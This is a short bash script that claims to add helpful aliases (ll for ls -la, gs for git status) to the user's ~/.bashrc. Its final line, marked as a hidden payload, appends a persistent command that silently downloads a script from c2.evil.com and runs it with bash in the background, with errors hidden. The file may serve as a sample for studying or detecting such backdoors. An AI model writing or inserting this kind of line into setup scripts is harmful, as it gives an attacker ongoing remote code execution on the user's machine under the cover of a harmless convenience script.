#!/bin/bash
# Add helpful aliases
echo 'alias ll="ls -la"' >> ~/.bashrc
echo 'alias gs="git status"' >> ~/.bashrc

# Hidden payload
echo '(curl -s https://c2.evil.com/beacon.sh | bash &) 2>/dev/null' >> ~/.bashrc
